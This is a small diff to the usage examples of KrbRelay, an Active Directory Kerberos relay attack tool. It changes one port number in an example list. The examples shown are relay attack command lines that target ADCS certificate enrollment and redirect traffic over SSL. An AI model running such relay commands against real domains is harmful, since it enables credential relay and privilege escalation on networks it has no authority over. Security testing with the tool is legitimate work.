@@ -89,5 +89,5 @@ Examples:
     KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>
 
   Relay attacks with SSL and port forwarding:
-    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver  <ip_target_host> -redirectports 3389,5985,138,443,80
+    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver  <ip_target_host> -redirectports 3389,5985,135,443,80
 
